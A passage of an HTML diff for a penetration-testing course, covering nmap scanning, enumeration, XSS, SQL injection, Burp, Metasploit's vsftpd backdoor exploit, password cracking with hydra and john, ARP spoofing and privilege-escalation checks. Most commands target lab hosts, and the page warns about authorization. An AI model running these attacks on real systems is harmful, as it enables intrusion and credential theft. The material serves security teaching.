+          <article class="module" id="m4">
+            <div class="module-label">MODULE 04 · NMAP</div>
+            <h2>Active reconnaissance with nmap</h2>
+            <p class="lead">
+              nmap is the swiss-army-knife of active recon. In four commands you
+              go from <em>"is anything alive at this address?"</em> to
+              <em>"that web server is running Apache 2.4.7 on Ubuntu, here are
+              its open ports, here are the matching CVEs"</em>.
+            </p>
+
+            <h3>The four scan types you'll use the most</h3>
+            <div class="crypto-scene">
+              <svg viewBox="0 0 760 200" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Nmap scan types: ping sweep, SYN scan, version detection, aggressive.">
+                <g font-family="Menlo" font-size="11">
+                  <rect x="20"  y="40" width="170" height="120" rx="12" fill="#1a1a22" stroke="#3caaff"/>
+                  <text x="105" y="65"  text-anchor="middle" fill="#3caaff" font-size="13">-sn</text>
+                  <text x="105" y="88"  text-anchor="middle" fill="#fff">ping sweep</text>
+                  <text x="105" y="110" text-anchor="middle" fill="#9aa6b2">who is alive</text>
+                  <text x="105" y="130" text-anchor="middle" fill="#9aa6b2">on the subnet?</text>
+                  <text x="105" y="150" text-anchor="middle" fill="#cfd6e0">no port scan</text>
+
+                  <rect x="210" y="40" width="170" height="120" rx="12" fill="#1a1a22" stroke="#ffbd2e"/>
+                  <text x="295" y="65"  text-anchor="middle" fill="#ffbd2e" font-size="13">-sS</text>
+                  <text x="295" y="88"  text-anchor="middle" fill="#fff">TCP SYN scan</text>
+                  <text x="295" y="110" text-anchor="middle" fill="#9aa6b2">half-open</text>
+                  <text x="295" y="130" text-anchor="middle" fill="#9aa6b2">stealthy default</text>
+                  <text x="295" y="150" text-anchor="middle" fill="#cfd6e0">needs root</text>
+
+                  <rect x="400" y="40" width="170" height="120" rx="12" fill="#1a1a22" stroke="#27c93f"/>
+                  <text x="485" y="65"  text-anchor="middle" fill="#27c93f" font-size="13">-sV</text>
+                  <text x="485" y="88"  text-anchor="middle" fill="#fff">version detect</text>
+                  <text x="485" y="110" text-anchor="middle" fill="#9aa6b2">probes service</text>
+                  <text x="485" y="130" text-anchor="middle" fill="#9aa6b2">banners</text>
+                  <text x="485" y="150" text-anchor="middle" fill="#cfd6e0">CVE candidates</text>
+
+                  <rect x="590" y="40" width="170" height="120" rx="12" fill="#1a1a22" stroke="#ff5f56"/>
+                  <text x="675" y="65"  text-anchor="middle" fill="#ff5f56" font-size="13">-A</text>
+                  <text x="675" y="88"  text-anchor="middle" fill="#fff">aggressive</text>
+                  <text x="675" y="110" text-anchor="middle" fill="#9aa6b2">OS + versions</text>
+                  <text x="675" y="130" text-anchor="middle" fill="#9aa6b2">+ default scripts</text>
+                  <text x="675" y="150" text-anchor="middle" fill="#cfd6e0">noisiest</text>
+                </g>
+              </svg>
+              <div class="caption">Walk left to right as the engagement matures: ping sweep first, aggressive last.</div>
+            </div>
+
+            <div class="cmd-block">$ nmap -sn 10.0.0.0/24                       <span style="color:#666"># 1. host discovery</span>
+$ sudo nmap -sS scanme.nmap.org              <span style="color:#666"># 2. SYN scan (raw socket -> sudo)</span>
+$ nmap -sV scanme.nmap.org                   <span style="color:#666"># 3. service versions</span>
+$ nmap -A  scanme.nmap.org                   <span style="color:#666"># 4. OS + scripts + versions</span>
+$ nmap --script vuln scanme.nmap.org         <span style="color:#666"># 5. NSE vulnerability checks</span></div>
+
+            <div class="warn">
+              <strong>scanme.nmap.org</strong> is the only public host the nmap
+              project explicitly authorises everyone to scan. Use it for these
+              labs and don't point any of these commands at a system you don't
+              own and haven't been written authorization for.
+            </div>
+
+            <div class="chapter-lab" data-chapter="4"></div>
+
+            <p style="margin-top:14px">
+              Open ports tell you <em>where</em> to knock. Chapter 5 figures out
+              <em>what's behind</em> each door.
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 5 ============================ -->
+          <article class="module" id="m5">
+            <div class="module-label">MODULE 05 · ENUMERATION</div>
+            <h2>Service enumeration — what's behind each port</h2>
+            <p class="lead">
+              Once nmap shows port 80 open, you don't just stop there — you
+              enumerate every URL, every default page, every share, every
+              banner. Service enumeration is where most pen-tests find their
+              first real foothold.
+            </p>
+
+            <table class="nf-table">
+              <thead><tr><th>Port / service</th><th>Tool</th><th>What you're looking for</th></tr></thead>
+              <tbody>
+                <tr><td>80 / 443 (HTTP/S)</td><td><code>gobuster</code>, <code>dirb</code>, <code>nikto</code></td><td>hidden directories, admin panels, default pages, backup files (<code>config.old</code>, <code>.git</code>).</td></tr>
+                <tr><td>139 / 445 (SMB)</td><td><code>smbclient -L</code>, <code>enum4linux -a</code></td><td>anonymously-listable shares, user lists, password policies.</td></tr>
+                <tr><td>21 / 22 (FTP/SSH)</td><td><code>nc -nv</code>, <code>curl</code></td><td>banner versions; anonymous FTP; SSH algorithms.</td></tr>
+                <tr><td>25 (SMTP)</td><td><code>nc</code> + <code>VRFY</code> / <code>EXPN</code></td><td>open relays, valid usernames.</td></tr>
+                <tr><td>3306 / 5432 (DB)</td><td><code>nmap -sV --script=mysql-info</code></td><td>version, default creds (<code>root</code>/<code>&lt;blank&gt;</code>).</td></tr>
+              </tbody>
+            </table>
+
+            <div class="cmd-block">$ gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
+$ nikto -h http://target
+$ smbclient -L //10.10.10.10 -N
+$ enum4linux -a 10.10.10.10
+$ nc -nv 10.10.10.10 21</div>
+
+            <div class="chapter-lab" data-chapter="5"></div>
+
+            <p style="margin-top:14px">
+              Now you know what's installed and what version. Chapter 6 turns
+              that into a list of vulnerabilities.
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 6 ============================ -->
+          <article class="module" id="m6">
+            <div class="module-label">MODULE 06 · VULN ID</div>
+            <h2>Vulnerability identification</h2>
+            <p class="lead">
+              Enumeration gives you a fingerprint
+              (<code>vsftpd 2.3.4</code>, <code>Apache 2.4.7</code>,
+              <code>OpenSSH 6.6.1p1</code>). Vulnerability identification turns
+              that fingerprint into a CVE list, a CVSS score and a known
+              exploit path.
+            </p>
+
+            <h3>The local exploit database</h3>
+            <p>
+              Kali ships with the entire Exploit-DB archive, indexed for
+              <code>searchsploit</code>:
+            </p>
+            <div class="cmd-block">$ searchsploit vsftpd 2.3.4
+Exploit Title                                     | Path
+---------------------------------------------------+-----
+vsftpd 2.3.4 - Backdoor Command Execution         | unix/remote/49757.py</div>
+
+            <h3>CVSS in 60 seconds</h3>
+            <p>
+              Every finding in your report carries a CVSS Base Score (0.0 - 10.0):
+            </p>
+            <ul>
+              <li><strong>9.0 - 10.0</strong> Critical &mdash; remote pre-auth RCE.</li>
+              <li><strong>7.0 - 8.9</strong> High &mdash; auth-required RCE / SQLi extracting hashes.</li>
+              <li><strong>4.0 - 6.9</strong> Medium &mdash; reflected XSS, IDOR.</li>
+              <li><strong>0.1 - 3.9</strong> Low &mdash; verbose error messages, missing security headers.</li>
+            </ul>
+
+            <div class="tip">
+              <strong>Free wins.</strong> Before launching exploits, check
+              default credentials. <code>admin/admin</code>,
+              <code>root/toor</code> (Kali!), <code>tomcat/tomcat</code>,
+              <code>postgres/postgres</code> account for an embarrassing
+              fraction of real-world breaches.
+            </div>
+
+            <div class="chapter-lab" data-chapter="6"></div>
+
+            <p style="margin-top:14px">
+              You have a list of likely weaknesses. Chapter 7 gives you another
+              source of intelligence: the wire itself.
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 7 ============================ -->
+          <article class="module" id="m7">
+            <div class="module-label">MODULE 07 · SNIFFING</div>
+            <h2>Network sniffing &amp; man-in-the-middle</h2>
+            <p class="lead">
+              When you can read traffic on the wire (your own VPN segment,
+              loopback, or an authorized switch span), plaintext credentials and
+              session cookies fall out. <code>tcpdump</code> captures them;
+              <code>tshark</code> / Wireshark dissect them.
+            </p>
+
+            <table class="nf-table">
+              <thead><tr><th>Step</th><th>Command</th></tr></thead>
+              <tbody>
+                <tr><td>Live capture (10 packets, any iface)</td><td><code>sudo tcpdump -i any -c 10</code></td></tr>
+                <tr><td>Read a saved pcap</td><td><code>tshark -r capture.pcap</code></td></tr>
+                <tr><td>HTTP only</td><td><code>tshark -r capture.pcap -Y http</code></td></tr>
+                <tr><td>Hunt plaintext creds</td><td><code>strings capture.pcap | grep -i pass</code></td></tr>
+              </tbody>
+            </table>
+
+            <h3>ARP poisoning (theory only)</h3>
+            <p>
+              In a switched LAN, ARP poisoning sends forged
+              <em>ARP-reply</em> messages so that the victim's machine and the
+              gateway both believe <em>your</em> MAC is the other party's. All
+              their traffic now flows through you (a man-in-the-middle).
+              <code>arpspoof -i tap0 -t victim -r gateway</code> with
+              <code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code> is the
+              eJPT classic. Run this <strong>only</strong> in a lab you own.
+            </p>
+
+            <div class="warn">
+              <strong>Don't run live arpspoof or telnet sniffing on a real
+              network without written authorization.</strong> It is a textbook
+              CFAA / Computer Misuse Act offence.
+            </div>
+
+            <div class="chapter-lab" data-chapter="7"></div>
+
+            <p style="margin-top:14px">
+              From the network we move into the most-attacked surface in
+              modern engagements: the web layer. Chapter 8.
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 8 ============================ -->
+          <article class="module" id="m8">
+            <div class="module-label">MODULE 08 · XSS</div>
+            <h2>Cross-Site Scripting (XSS)</h2>
+            <p class="lead">
+              XSS is when attacker-controlled text ends up inside a victim's
+              browser as code. With one crafted link an attacker can read the
+              page, exfiltrate cookies, log keystrokes, or pivot CSRF.
+            </p>
+
+            <div class="crypto-scene">
+              <svg viewBox="0 0 760 240" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="XSS reflected vs stored: where the payload lives.">
+                <defs>
+                  <marker id="arrR8" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+                    <path d="M0,0 L10,5 L0,10 z" fill="#ff5f56"/>
+                  </marker>
+                </defs>
+                <g font-family="Menlo" font-size="11">
+                  <text x="380" y="22" text-anchor="middle" fill="#ff5f56" font-size="13" font-weight="700">REFLECTED vs STORED</text>
+
+                  <text x="60"  y="60" fill="#cfd6e0">Reflected</text>
+                  <circle cx="80"  cy="100" r="22" fill="#1a1a22" stroke="#ff5f56"/><text x="80"  y="105" text-anchor="middle" fill="#ff5f56">A</text>
+                  <text x="80"  y="135" text-anchor="middle" fill="#cfd6e0" font-size="10">attacker</text>
+                  <line x1="105" y1="100" x2="270" y2="100" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR8)"/>
+                  <text x="180" y="92" text-anchor="middle" fill="#ff5f56" font-size="10">crafted link</text>
+                  <circle cx="300" cy="100" r="22" fill="#1a1a22" stroke="#3caaff"/><text x="300" y="105" text-anchor="middle" fill="#3caaff">V</text>
+                  <text x="300" y="135" text-anchor="middle" fill="#cde6ff" font-size="10">victim browser</text>
+                  <line x1="325" y1="100" x2="490" y2="100" stroke="#9aa6b2" stroke-width="2" marker-end="url(#arrR8)"/>
+                  <text x="408" y="92" text-anchor="middle" fill="#9aa6b2" font-size="10">request reflects payload</text>
+                  <rect x="490" y="80" width="200" height="40" rx="6" fill="#0a0a0d" stroke="#ff5f56"/>
+                  <text x="590" y="105" text-anchor="middle" fill="#ff5f56" font-size="11">server echoes payload</text>
+
+                  <text x="60"  y="170" fill="#cfd6e0">Stored</text>
+                  <circle cx="80"  cy="200" r="22" fill="#1a1a22" stroke="#ff5f56"/><text x="80"  y="205" text-anchor="middle" fill="#ff5f56">A</text>
+                  <line x1="105" y1="200" x2="270" y2="200" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR8)"/>
+                  <text x="180" y="192" text-anchor="middle" fill="#ff5f56" font-size="10">posts payload (DB)</text>
+                  <rect x="270" y="180" width="100" height="40" rx="6" fill="#0a0a0d" stroke="#9aa6b2"/>
+                  <text x="320" y="205" text-anchor="middle" fill="#9aa6b2" font-size="11">DB</text>
+                  <line x1="370" y1="200" x2="490" y2="200" stroke="#9aa6b2" stroke-width="2" marker-end="url(#arrR8)"/>
+                  <text x="430" y="192" text-anchor="middle" fill="#9aa6b2" font-size="10">every visit triggers</text>
+                  <circle cx="520" cy="200" r="22" fill="#1a1a22" stroke="#3caaff"/><text x="520" y="205" text-anchor="middle" fill="#3caaff">V1</text>
+                  <circle cx="580" cy="200" r="22" fill="#1a1a22" stroke="#3caaff"/><text x="580" y="205" text-anchor="middle" fill="#3caaff">V2</text>
+                  <circle cx="640" cy="200" r="22" fill="#1a1a22" stroke="#3caaff"/><text x="640" y="205" text-anchor="middle" fill="#3caaff">V3</text>
+                </g>
+              </svg>
+              <div class="caption">Reflected = single victim per crafted link. Stored = every visitor of the affected page. Stored is the higher-impact bug.</div>
+            </div>
+
+            <h3>The proof-of-concept that ends every dispute</h3>
+            <div class="cmd-block">$ curl 'http://localhost:8080/search?q=&lt;script&gt;alert(1)&lt;/script&gt;'
+&lt;h1&gt;Results for &lt;script&gt;alert(1)&lt;/script&gt;&lt;/h1&gt;</div>
+
+            <h3>What it achieves &amp; what it can't</h3>
+            <div class="method-card">
+              <div class="obj">
+                <h4>Objective</h4>
+                <strong>Run JS in someone else's browser.</strong> Read the
+                page, exfiltrate cookies, log keystrokes, phish creds, pivot
+                CSRF, deface.
+              </div>
+              <div class="weak">
+                <h4>Weakness</h4>
+                <strong>HttpOnly cookies + good CSP shut you out.</strong>
+                Modern frameworks auto-encode by default, so XSS is rarer in
+                React/Vue front-ends than in 2010-era PHP apps.
+              </div>
+              <div class="alt">
+                <h4>Mitigations</h4>
+                Output-encode by context, use auto-escaping templates, enable a
+                strict <strong>Content-Security-Policy</strong>, set
+                <strong>HttpOnly</strong>+<strong>Secure</strong> on session
+                cookies, and sanitise rich-text input with DOMPurify.
+              </div>
+            </div>
+
+            <div class="chapter-lab" data-chapter="8"></div>
+
+            <p style="margin-top:14px">
+              XSS lives in the browser. Chapter 9 attacks the database the
+              browser is talking to.
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 9 ============================ -->
+          <article class="module" id="m9">
+            <div class="module-label">MODULE 09 · SQL INJECTION</div>
+            <h2>SQL Injection</h2>
+            <p class="lead">
+              When user input lands inside a SQL string without sanitisation,
+              the attacker can rewrite the query the database actually runs.
+              From a confirmed SQLi you can list databases, dump credential
+              tables, sometimes write files to disk and pivot to RCE.
+            </p>
+
+            <h3>The four-step exploitation pattern</h3>
+            <div class="crypto-scene">
+              <svg viewBox="0 0 760 200" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="SQL injection workflow: confirm, boolean, UNION, dump.">
+                <defs>
+                  <marker id="arrR9" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+                    <path d="M0,0 L10,5 L0,10 z" fill="#ff5f56"/>
+                  </marker>
+                </defs>
+                <g font-family="Menlo" font-size="11">
+                  <rect x="20"  y="60" width="160" height="80" rx="10" fill="#1a1a22" stroke="#ffbd2e"/>
+                  <text x="100" y="90"  text-anchor="middle" fill="#ffbd2e" font-size="12">1. CONFIRM</text>
+                  <text x="100" y="110" text-anchor="middle" fill="#cfd6e0">id=1'</text>
+                  <text x="100" y="125" text-anchor="middle" fill="#9aa6b2" font-size="10">SQL error?</text>
+
+                  <rect x="200" y="60" width="160" height="80" rx="10" fill="#1a1a22" stroke="#3caaff"/>
+                  <text x="280" y="90"  text-anchor="middle" fill="#3caaff" font-size="12">2. BOOLEAN</text>
+                  <text x="280" y="110" text-anchor="middle" fill="#cfd6e0">id=1 OR 1=1</text>
+                  <text x="280" y="125" text-anchor="middle" fill="#9aa6b2" font-size="10">all rows</text>
+
+                  <rect x="380" y="60" width="180" height="80" rx="10" fill="#1a1a22" stroke="#ff5f56"/>
+                  <text x="470" y="90"  text-anchor="middle" fill="#ff5f56" font-size="12">3. UNION</text>
+                  <text x="470" y="110" text-anchor="middle" fill="#cfd6e0">UNION SELECT 1,2,3</text>
+                  <text x="470" y="125" text-anchor="middle" fill="#9aa6b2" font-size="10">extract columns</text>
+
+                  <rect x="580" y="60" width="160" height="80" rx="10" fill="#1a1a22" stroke="#27c93f"/>
+                  <text x="660" y="90"  text-anchor="middle" fill="#27c93f" font-size="12">4. DUMP</text>
+                  <text x="660" y="110" text-anchor="middle" fill="#cfd6e0">sqlmap --dump</text>
+                  <text x="660" y="125" text-anchor="middle" fill="#9aa6b2" font-size="10">automate</text>
+
+                  <line x1="180" y1="100" x2="200" y2="100" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR9)"/>
+                  <line x1="360" y1="100" x2="380" y2="100" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR9)"/>
+                  <line x1="560" y1="100" x2="580" y2="100" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR9)"/>
+                </g>
+              </svg>
+              <div class="caption">Confirm with a single quote. Use booleans to map behaviour. UNION to extract columns. Hand off to sqlmap once you've proved it manually.</div>
+            </div>
+
+            <div class="cmd-block">$ curl "http://localhost:8080/news?id=1'"                <span style="color:#666"># 1. confirm</span>
+$ curl "http://localhost:8080/news?id=1+OR+1=1"          <span style="color:#666"># 2. boolean</span>
+$ curl "http://localhost:8080/news?id=1+UNION+SELECT+1,2,3"  <span style="color:#666"># 3. UNION</span>
+$ sqlmap -u 'http://localhost:8080/news?id=1' --batch --dbs  <span style="color:#666"># 4. automate</span></div>
+
+            <div class="tip">
+              <strong>The fix is one line of code.</strong> Use parameterised
+              queries (prepared statements). Stored procs and ORM
+              <code>.where()</code> with placeholders are safe. String
+              concatenation is not.
+            </div>
+
+            <div class="chapter-lab" data-chapter="9"></div>
+
+            <p style="margin-top:14px">
+              Manual exploitation with curl is great for proving things. The
+              real workflow uses an HTTP proxy to mutate every request &mdash;
+              that's chapter 10.
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 10 ============================ -->
+          <article class="module" id="m10">
+            <div class="module-label">MODULE 10 · BURP</div>
+            <h2>Burp Suite &amp; HTTP manipulation</h2>
+            <p class="lead">
+              Burp Suite is the swiss-army-knife web proxy. It sits between
+              your browser and the target server, captures every request, and
+              lets you mutate any of them by hand. The CLI equivalent is
+              <code>curl -x http://127.0.0.1:8080 …</code> &mdash; same idea,
+              less mouse.
+            </p>
+
+            <h3>Burp's modules at a glance</h3>
+            <table class="nf-table">
+              <thead><tr><th>Module</th><th>Use</th></tr></thead>
+              <tbody>
+                <tr><td><strong>Proxy</strong></td><td>Intercept every request your browser sends.</td></tr>
+                <tr><td><strong>Repeater</strong></td><td>Replay a captured request with edits, instantly.</td></tr>
+                <tr><td><strong>Intruder</strong></td><td>Fuzz a single parameter with a payload list.</td></tr>
+                <tr><td><strong>Scanner</strong> (Pro)</td><td>Automated vuln crawl.</td></tr>
+                <tr><td><strong>Decoder</strong></td><td>base64 / URL / hex / hash helpers.</td></tr>
+                <tr><td><strong>Comparer</strong></td><td>Diff two responses after small changes.</td></tr>
+              </tbody>
+            </table>
+
+            <h3>Curl is your CLI Burp</h3>
+            <div class="cmd-block">$ curl -x http://127.0.0.1:8080 http://target          <span style="color:#666"># route through Burp</span>
+$ curl -H 'X-Forwarded-For: 127.0.0.1' http://target/admin   <span style="color:#666"># header tampering</span>
+$ curl -d 'a=b'  http://target -X PUT                  <span style="color:#666"># tamper body / method</span></div>
+
+            <div class="tip">
+              <strong>SSRF / IDOR.</strong> While you have a proxy in front of
+              every request, two extra bug classes are usually one click away:
+              <em>SSRF</em> (server fetches a URL the user supplied — point at
+              <code>http://169.254.169.254/</code> on AWS for cloud metadata)
+              and <em>IDOR</em> (object IDs aren't authenticated — try
+              <code>/orders/124</code> &rarr; <code>/orders/125</code>).
+            </div>
+
+            <div class="chapter-lab" data-chapter="10"></div>
+
+            <p style="margin-top:14px">
+              Web exploitation gets you a foothold on the application. Chapter 11
+              gets you a foothold on the operating system underneath.
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 11 ============================ -->
+          <article class="module" id="m11">
+            <div class="module-label">MODULE 11 · METASPLOIT</div>
+            <h2>System exploitation with Metasploit</h2>
+            <p class="lead">
+              Metasploit is the largest collection of curated exploits, payloads
+              and post-exploitation modules you can run from one console. The
+              eJPT-style kill chain is: <em>recon &rarr; pick exploit &rarr;
+              configure &rarr; fire &rarr; meterpreter &rarr; privesc &rarr;
+              persistence</em>.
+            </p>
+
+            <div class="crypto-scene">
+              <svg viewBox="0 0 760 220" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Metasploit kill chain: from recon to meterpreter to persistence.">
+                <defs>
+                  <marker id="arrR11" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+                    <path d="M0,0 L10,5 L0,10 z" fill="#ff5f56"/>
+                  </marker>
+                </defs>
+                <g font-family="Menlo" font-size="11">
+                  <rect x="20"  y="40" width="110" height="60" rx="10" fill="#1a1a22" stroke="#3caaff"/>
+                  <text x="75"  y="65" text-anchor="middle" fill="#3caaff">RECON</text>
+                  <text x="75"  y="83" text-anchor="middle" fill="#9aa6b2" font-size="10">nmap -sV</text>
+
+                  <rect x="160" y="40" width="110" height="60" rx="10" fill="#1a1a22" stroke="#ffbd2e"/>
+                  <text x="215" y="65" text-anchor="middle" fill="#ffbd2e">SEARCH</text>
+                  <text x="215" y="83" text-anchor="middle" fill="#9aa6b2" font-size="10">search vsftpd</text>
+
+                  <rect x="300" y="40" width="110" height="60" rx="10" fill="#1a1a22" stroke="#ff8a2e"/>
+                  <text x="355" y="65" text-anchor="middle" fill="#ff8a2e">USE / SET</text>
+                  <text x="355" y="83" text-anchor="middle" fill="#9aa6b2" font-size="10">RHOSTS LHOST</text>
+
+                  <rect x="440" y="40" width="110" height="60" rx="10" fill="#1a1a22" stroke="#ff5f56"/>
+                  <text x="495" y="65" text-anchor="middle" fill="#ff5f56">EXPLOIT</text>
+                  <text x="495" y="83" text-anchor="middle" fill="#9aa6b2" font-size="10">payload fires</text>
+
+                  <rect x="580" y="40" width="160" height="60" rx="10" fill="#1a1a22" stroke="#27c93f"/>
+                  <text x="660" y="65" text-anchor="middle" fill="#27c93f">METERPRETER</text>
+                  <text x="660" y="83" text-anchor="middle" fill="#9aa6b2" font-size="10">session</text>
+
+                  <line x1="130" y1="70" x2="160" y2="70" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR11)"/>
+                  <line x1="270" y1="70" x2="300" y2="70" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR11)"/>
+                  <line x1="410" y1="70" x2="440" y2="70" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR11)"/>
+                  <line x1="550" y1="70" x2="580" y2="70" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR11)"/>
+
+                  <rect x="160" y="140" width="110" height="60" rx="10" fill="#1a1a22" stroke="#27c93f"/>
+                  <text x="215" y="165" text-anchor="middle" fill="#27c93f">getsystem</text>
+                  <text x="215" y="183" text-anchor="middle" fill="#9aa6b2" font-size="10">privesc</text>
+
+                  <rect x="300" y="140" width="110" height="60" rx="10" fill="#1a1a22" stroke="#27c93f"/>
+                  <text x="355" y="165" text-anchor="middle" fill="#27c93f">hashdump</text>
+                  <text x="355" y="183" text-anchor="middle" fill="#9aa6b2" font-size="10">SAM hashes</text>
+
+                  <rect x="440" y="140" width="160" height="60" rx="10" fill="#1a1a22" stroke="#ff5f56"/>
+                  <text x="520" y="165" text-anchor="middle" fill="#ff5f56">persistence</text>
+                  <text x="520" y="183" text-anchor="middle" fill="#9aa6b2" font-size="10">drop backdoor</text>
+
+                  <line x1="660" y1="100" x2="215" y2="140" stroke="#ff5f56" stroke-width="1.5" stroke-dasharray="4 4"/>
+                  <line x1="270" y1="170" x2="300" y2="170" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR11)"/>
+                  <line x1="410" y1="170" x2="440" y2="170" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR11)"/>
+                </g>
+              </svg>
+              <div class="caption">Recon &rarr; pick the exploit &rarr; configure &rarr; fire &rarr; meterpreter session &rarr; privesc &rarr; loot &rarr; persistence (only if the ROE allows it).</div>
+            </div>
+
+            <h3>The console you'll memorise</h3>
+            <div class="cmd-block">msf6 &gt; <span style="color:#ffbd2e">search</span> vsftpd
+msf6 &gt; <span style="color:#ffbd2e">use</span> exploit/unix/ftp/vsftpd_234_backdoor
+msf6 &gt; <span style="color:#ffbd2e">show options</span>
+msf6 &gt; <span style="color:#ffbd2e">set</span> RHOSTS 10.10.10.10
+msf6 &gt; <span style="color:#ffbd2e">set</span> PAYLOAD cmd/unix/interact
+msf6 &gt; <span style="color:#ffbd2e">exploit</span></div>
+
+            <div class="tip">
+              <strong>Image size note.</strong> The full
+              <code>metasploit-framework</code> package is &gt;1 GB so this
+              sandbox image leaves it OPT-IN
+              (<code>sudo apt install metasploit-framework</code>). The chapter
+              tasks use <code>searchsploit</code> + the seeded
+              <code>msf.md</code>, <code>meterpreter.md</code>,
+              <code>msfvenom.md</code> cheat sheets.
+            </div>
+
+            <div class="chapter-lab" data-chapter="11"></div>
+
+            <p style="margin-top:14px">
+              You're root on the target. Chapter 12 turns that access into a
+              report — and earns the engagement its money.
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 12 ============================ -->
+          <article class="module" id="m12">
+            <div class="module-label">MODULE 12 · POST-EXPLOITATION</div>
+            <h2>Passwords, privilege escalation &amp; the report</h2>
+            <p class="lead">
+              The last chapter wraps three skills: cracking the credentials
+              you've stolen, escalating from a low-priv shell to root, and
+              writing the document that turns all of this into business value.
+            </p>
+
+            <h3>Password attacks</h3>
+            <ul>
+              <li><strong>John the Ripper</strong> — offline cracker. Loves
+                <code>/usr/share/wordlists/rockyou.txt</code>.</li>
+              <li><strong>Hashcat</strong> — GPU-accelerated john. Better for
+                large hash lists.</li>
+              <li><strong>Hydra</strong> — online brute-force across SSH, FTP,
+                HTTP-form, RDP, SMB, MSSQL.</li>
+              <li><strong>unshadow</strong> — combines <code>/etc/passwd</code> +
+                <code>/etc/shadow</code> into a john-readable file.</li>
+            </ul>
+
+            <div class="cmd-block">$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+$ hydra -L users.txt -P passwords.txt ssh://10.10.10.10
+$ unshadow passwd shadow &gt; all.txt &amp;&amp; john all.txt</div>
+
+            <h3>Linux privilege escalation</h3>
+            <p>
+              Once you have a low-privilege shell, the privesc checklist:
+            </p>
+            <div class="cmd-block">$ sudo -l                                      <span style="color:#666"># am I sudoer?</span>
+$ find / -perm -4000 -type f 2&gt;/dev/null       <span style="color:#666"># SUID binaries</span>
+$ getcap -r / 2&gt;/dev/null                      <span style="color:#666"># file capabilities</span>
+$ cat /etc/crontab                             <span style="color:#666"># scheduled jobs</span>
+$ ps aux | grep root                           <span style="color:#666"># root processes</span></div>
+
+            <h3>The report</h3>
+            <p>
+              A finding without a clear remediation step is half-finished. Every
+              report has the same skeleton: <em>executive summary &rarr; scope
+              &rarr; findings &rarr; attack narrative &rarr; remediation roadmap
+              &rarr; appendices &rarr; retest section</em>. Each finding gets a
+              CVSS vector, steps to reproduce, evidence and a specific
+              recommendation.
+            </p>
+
+            <div class="chapter-lab" data-chapter="12"></div>
+
+            <p style="margin-top:14px">
+              That's the full kill chain. The capstone below ties chapters 4,
+              5, 9 and 12 together with the seeded vulnerable HTTP server in
+              the sandbox.
+            </p>
+          </article>
+
+          <!-- ============================ TOOLS REFERENCE ============================ -->
+          <section class="tools-section" id="tools">
+            <h2>Tools reference</h2>
+            <p class="lead">
+              Every tool the course touches, in one place. Bookmarks this section
+              for the engagement &mdash; everything below is one
+              <code>apt install</code> away on Kali.
+            </p>
+            <div class="tools-grid">
+              <div class="tool-card">
+                <div class="role">Recon · OSINT</div>
+                <div class="name">whois</div>
+                <p class="desc">Domain registration: registrar, age, contacts, nameservers.</p>
+                <div class="ex">whois example.com</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Recon · DNS</div>
+                <div class="name">dig / host / nslookup</div>
+                <p class="desc">DNS records: A, MX, NS, TXT, reverse PTR.</p>
+                <div class="ex">dig MX example.com<br>dig -x 8.8.8.8</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Active scanning</div>
+                <div class="name">nmap</div>
+                <p class="desc">Host discovery, port scan, version detect, OS fingerprint, NSE scripts.</p>
+                <div class="ex">nmap -A scanme.nmap.org<br>nmap --script vuln target</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Web enum</div>
+                <div class="name">gobuster</div>
+                <p class="desc">Fast directory / DNS / vhost brute-forcer.</p>
+                <div class="ex">gobuster dir -u http://t -w wl.txt</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Web enum</div>
+                <div class="name">dirb</div>
+                <p class="desc">Classic web content scanner; default on Kali.</p>
+                <div class="ex">dirb http://target</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Web vuln scan</div>
+                <div class="name">nikto</div>
+                <p class="desc">Web server vuln scanner — default pages, outdated versions, dangerous methods.</p>
+                <div class="ex">nikto -h http://target</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">SQLi automation</div>
+                <div class="name">sqlmap</div>
+                <p class="desc">Automatic SQL-injection detection &amp; exploitation. Detects MySQL, PostgreSQL, MSSQL, Oracle.</p>
+                <div class="ex">sqlmap -u 'http://t/?id=1' --batch --dbs</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Web proxy</div>
+                <div class="name">Burp Suite</div>
+                <p class="desc">Proxy + Repeater + Intruder. The standard manual-testing GUI.</p>
+                <div class="ex">curl -x http://127.0.0.1:8080 http://t</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Network sniffer</div>
+                <div class="name">tcpdump</div>
+                <p class="desc">Lightweight CLI packet capture.</p>
+                <div class="ex">sudo tcpdump -i any -c 10 -w cap.pcap</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Network analyzer</div>
+                <div class="name">tshark / Wireshark</div>
